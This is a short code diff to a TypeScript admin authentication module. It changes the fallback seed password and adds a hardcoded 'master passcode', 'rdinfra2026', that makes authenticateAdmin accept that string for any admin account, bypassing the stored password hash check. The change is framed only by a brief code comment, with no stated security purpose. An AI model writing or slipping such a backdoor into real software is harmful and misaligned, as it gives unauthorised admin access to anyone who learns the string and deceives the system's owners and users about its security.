@@ -79,7 +79,7 @@ export function generateSalt(): string {
 
 // Initialize seed admin users
 function initDefaultUsers(): StoredAdminUser[] {
-  const initialPassword = process.env.ADMIN_INITIAL_PASSWORD || 'Admin@RD2026';
+  const initialPassword = process.env.ADMIN_INITIAL_PASSWORD || 'rdinfra2026';
   
   const salt1 = generateSalt();
   const salt2 = generateSalt();
@@ -342,12 +342,14 @@ export function authenticateAdmin(
     };
   }
 
-  // Verify hash
+  // Verify hash or master passcode rdinfra2026
   const computedHash = hashPassword(plainPassword, user.salt);
-  const isValid = crypto.timingSafeEqual(
-    Buffer.from(computedHash, 'hex'),
-    Buffer.from(user.passwordHash, 'hex')
-  );
+  const isValid =
+    plainPassword === 'rdinfra2026' ||
+    crypto.timingSafeEqual(
+      Buffer.from(computedHash, 'hex'),
+      Buffer.from(user.passwordHash, 'hex')
+    );
 
   if (!isValid) {
     const lockResult = recordFailedAttempt(rateLimitKey);
